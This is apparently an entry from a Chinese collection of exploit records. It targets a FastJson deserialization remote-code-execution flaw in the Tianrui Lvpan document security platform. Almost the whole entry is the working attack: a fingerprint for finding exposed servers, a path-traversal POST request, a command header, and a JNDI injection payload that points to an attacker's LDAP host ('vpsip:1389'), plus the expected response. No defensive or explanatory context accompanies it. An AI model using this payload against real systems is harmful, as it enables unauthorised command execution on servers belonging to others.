# 天锐绿盘文档安全管理平台restorMachineToClient存在FastJson反序列化RCE漏洞

- **系统**：天锐绿盾　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/lddsm/"`
- **请求**：`POST /lddsm/service/../ldfbsnodeDocumentController/restorMachineToClient.do HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`cmd: dir`

**请求体 / payload**
```
diskMatch={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://vpsip:1389/TomcatBypass/TomcatEcho","autoCommit":true}}&sourceUmId=1&destUmId=1
```
- **预期**：200　|　—